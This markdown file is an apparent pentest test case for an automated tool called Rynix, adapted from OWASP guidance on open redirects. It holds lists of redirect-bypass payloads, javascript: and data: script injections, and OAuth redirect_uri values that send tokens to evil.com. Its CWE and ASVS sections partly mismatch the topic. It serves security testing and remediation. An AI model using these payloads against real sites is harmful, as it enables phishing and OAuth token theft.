---
id: WSTG-INPV-16
title: Testing for HTTP Incoming Requests
category: Input Validation
severity_range: Medium-High
owasp_ref: https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/16-Testing_for_HTTP_Incoming_Requests
---

# WSTG-INPV-16: Testing for HTTP Incoming Requests

## Summary

This test focuses on open redirect and URL validation bypass vulnerabilities where an application redirects users to attacker-controlled destinations based on user-supplied input. Open redirects occur when an application accepts a URL parameter and redirects the user to that URL without proper validation. Attackers exploit this to redirect victims to phishing sites, malware distribution pages, or OAuth token theft endpoints. The redirect appears trustworthy because the initial URL is on the legitimate domain. URL validation bypasses circumvent allowlist or blocklist mechanisms intended to prevent open redirects.

## Test Objectives

- Identify parameters that control redirect destinations
- Test if the application validates redirect URLs adequately
- Determine if URL validation can be bypassed to redirect to arbitrary domains
- Assess the risk of redirect-based phishing, token theft, and trust abuse

## Prerequisites

- Target application has redirect functionality (login redirects, OAuth flows, link shorteners, interstitial pages)
- Docker pentest container capturing traffic
- Application entry points have been mapped (WSTG-INFO-06)

## Test Steps

### Step 1: Identify Redirect Parameters

**CLI Actions:**
1. Use `curl` to identify all requests containing redirect-related parameters
2. Use `curl` with pattern `(redirect|url|next|return|goto|dest|target|rurl|redir|forward|continue|callback|path|ref|site|view|link|to|out|ReturnUrl)=` to find redirect parameters
3. Look for:
   - Login pages with return URL parameters
   - Logout redirects
   - OAuth callback URLs
   - Link tracking / click-through pages
   - Interstitial "you are leaving our site" pages
4. Use `save to manual-review file` for each endpoint with redirect parameters

### Step 2: Test Basic Open Redirect

**CLI Actions:**
Use `curl` to test if the application redirects to an external domain:

```
GET /redirect?url=https://evil.com HTTP/1.1
Host: target.com
```

```
GET /login?next=https://evil.com HTTP/1.1
Host: target.com
```

```
GET /goto?dest=https://evil.com HTTP/1.1
Host: target.com
```

Check the response for:
- 301/302/303/307/308 status codes with `Location: https://evil.com`
- Meta refresh tags pointing to the external domain
- JavaScript `window.location` redirects to the external domain

### Step 3: Test URL Validation Bypass Techniques

**CLI Actions:**
If basic external redirects are blocked, use `curl` to test bypass techniques:

**Using @ symbol to override hostname:**
```
GET /redirect?url=https://target.com@evil.com HTTP/1.1
Host: target.com
```

**Subdomain spoofing:**
```
GET /redirect?url=https://target.com.evil.com HTTP/1.1
Host: target.com
```

**Using backslash:**
```
GET /redirect?url=https://evil.com\target.com HTTP/1.1
Host: target.com
```

```
GET /redirect?url=//evil.com HTTP/1.1
Host: target.com
```

**Using URL encoding:**
```
GET /redirect?url=https://evil%2Ecom HTTP/1.1
Host: target.com
```

Use `curl --data-urlencode` and `python3 -c "import urllib.parse; ..."` for testing various encoding schemes.

### Step 4: Test Protocol-Relative and Scheme Variations

**CLI Actions:**
Use `curl` to test protocol handling:

```
GET /redirect?url=//evil.com HTTP/1.1
Host: target.com
```

```
GET /redirect?url=///evil.com HTTP/1.1
Host: target.com
```

```
GET /redirect?url=////evil.com HTTP/1.1
Host: target.com
```

```
GET /redirect?url=http://evil.com HTTP/1.1
Host: target.com
```

```
GET /redirect?url=javascript:alert(document.domain) HTTP/1.1
Host: target.com
```

```
GET /redirect?url=data:text/html,<script>alert(1)</script> HTTP/1.1
Host: target.com
```

### Step 5: Test Advanced Bypass Techniques

**CLI Actions:**
Use `curl` to test more sophisticated bypasses:

**Double URL encoding:**
```
GET /redirect?url=https%3A%2F%2Fevil.com HTTP/1.1
Host: target.com
```

```
GET /redirect?url=https%253A%252F%252Fevil.com HTTP/1.1
Host: target.com
```

**IP address variations:**
```
GET /redirect?url=http://0x7f000001 HTTP/1.1
Host: target.com
```

```
GET /redirect?url=http://2130706433 HTTP/1.1
Host: target.com
```

**Unicode normalization:**
```
GET /redirect?url=https://evil.com%E2%80%AE%E2%81%A6target.com HTTP/1.1
Host: target.com
```

**Null byte:**
```
GET /redirect?url=https://evil.com%00.target.com HTTP/1.1
Host: target.com
```

**Tab and newline characters:**
```
GET /redirect?url=https://evil%09.com HTTP/1.1
Host: target.com
```

**Using path confusion:**
```
GET /redirect?url=https://target.com/redirect?url=https://evil.com HTTP/1.1
Host: target.com
```

### Step 6: Test Redirect in POST Parameters

**CLI Actions:**
Use `curl` to test redirects controlled by POST body parameters:

```
POST /login HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=test&returnUrl=https://evil.com
```

```
POST /oauth/authorize HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

client_id=app&redirect_uri=https://evil.com/callback&response_type=code
```

### Step 7: Test Client-Side Redirect Handling

**CLI Actions:**
Use `curl` to fetch pages and examine if JavaScript performs redirects based on URL parameters:

```
GET /page?next=https://evil.com HTTP/1.1
Host: target.com
```

Examine the response for patterns like:
```javascript
window.location = getParam('next');
document.location.href = urlParams.get('redirect');
```

Use `rynix_plugin_run('template-scan')` to check if template-scan has identified any open redirect findings.

## Payloads

### Basic Open Redirect Payloads
```
https://evil.com
http://evil.com
//evil.com
///evil.com
////evil.com
/\evil.com
\/evil.com
```

### Domain Validation Bypass Payloads
```
https://target.com@evil.com
https://target.com.evil.com
https://evil.com/target.com
https://evil.com?target.com
https://evil.com#target.com
https://target.com%40evil.com
https://evil.com\target.com
https://evil.com/.target.com
```

### Encoding-Based Bypass Payloads
```
https%3A%2F%2Fevil.com
https%253A%252F%252Fevil.com
%68%74%74%70%73%3A%2F%2F%65%76%69%6C%2E%63%6F%6D
https://evil%2Ecom
//evil%2Ecom
```

### Protocol/Scheme Bypass Payloads
```
javascript:alert(document.domain)//
data:text/html,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
vbscript:msgbox("XSS")
```

### IP Address Bypass Payloads
```
http://0x42.0x0000066.0x7.0x93 (IP in hex)
http://1113984131 (IP as decimal integer)
http://0177.0.0.1 (IP in octal)
http://[::1] (IPv6 localhost)
http://127.1 (short IP)
```

### Unicode and Special Character Payloads
```
https://evil.com%E2%80%AE%E2%81%A6target.com
https://evil.com%00.target.com
https://evil.com%0d%0a.target.com
https://evil%E3%80%82com (fullwidth period)
https://evi1.com (homoglyph)
https://evil。com (ideographic period)
```

### Null Byte and Whitespace Payloads
```
https://evil.com%00
%00https://evil.com
https://evil.com%20
%09https://evil.com
%0ahttps://evil.com
```

### OAuth Redirect URI Bypass Payloads
```
https://target.com/callback/../../../evil.com
https://target.com/callback/..%2f..%2f..%2fevil.com
https://target.com/callback?redirect=evil.com
https://target.com/callback#@evil.com
```

## Detection Criteria

A finding should be logged when:
- The application redirects to an arbitrary external domain via a user-controlled parameter
- URL validation is bypassed using encoding, special characters, or URL parsing tricks
- JavaScript-based redirects use unvalidated URL parameters
- OAuth redirect_uri parameter accepts arbitrary external domains
- Protocol-relative URLs redirect to attacker-controlled domains

## Severity Assessment

| Condition | Severity |
|-----------|----------|
| Open redirect in OAuth flow enables token theft | High |
| Open redirect on login page enables credential phishing | High |
| Open redirect combined with SSRF for internal network access | High |
| Open redirect to arbitrary external domains | Medium |
| Client-side redirect via JavaScript | Medium |
| Redirect limited to same-origin subdomains | Low |
| Redirect validated and only allows same-domain paths | Informational |

## Remediation

- Avoid using user-supplied input for redirect destinations
- If redirects are necessary, use a mapping of allowed destinations (index-based: `?redirect=1` maps to a predefined URL)
- Validate redirect URLs against a strict allowlist of permitted domains
- Use server-side URL parsing to extract and validate the hostname before redirecting
- Reject redirects containing: `//`, `@`, backslashes, encoded characters in the hostname
- Prepend a fixed domain to user-supplied paths: redirect to `https://target.com/ + user_path`
- Set `Referrer-Policy: no-referrer` to prevent token leakage via Referer header
- For OAuth, enforce exact redirect_uri matching (not prefix matching)
- Display an interstitial warning page for any external redirect

## References

- [OWASP Testing Guide - HTTP Incoming Requests](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/16-Testing_for_HTTP_Incoming_Requests)
- [CWE-601: URL Redirection to Untrusted Site (Open Redirect)](https://cwe.mitre.org/data/definitions/601.html)
- [OWASP Unvalidated Redirects and Forwards Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html)

## Rynix workflow

1. `scope_check` and `register_scope` for the target host.
2. `get_wstg_test` for this test ID — read objectives.
3. Execute probes via `http_probe` / `compare_role_response` / `run_idor_matrix`.
4. `track_wstg_test` with status and evidence path.
5. `record_finding` only when verified with probe evidence.

## Evidence requirements

- Request/response snippet or `compare_role_response` diff.
- Session ID on all tool calls.
- No unverified claims in `export_report`.
## ASVS mapping

- V5 Validation — input handling and parser differentials.
- V12 Files and Resources — upload and inclusion controls.

## CWE references

- CWE-20: Improper Input Validation
- CWE-89: SQL Injection
- CWE-79: Cross-site Scripting

## Rynix tooling

- Primary tools: ``http_probe``, ``rynix_plugin_run` (template-scan)`, ``record_finding``

## Test focus

- Fuzz parameters with encoding variants (URL, Unicode, double-encoding).
- Switch Content-Type to traverse alternate validators.

## GenAI / LLM 2026 notes

- Cross-reference `knowledge/custom/genai_llm_security_2026.md` (OWASP LLM Top 10 mapping).
- Probe AI endpoints with `http_probe` only — no external LLM API keys in Rynix runtime.
- Use `compare_role_response` to detect cross-tenant prompt/response leakage.
- Map findings to LLM01–LLM10 categories in `export_report`.

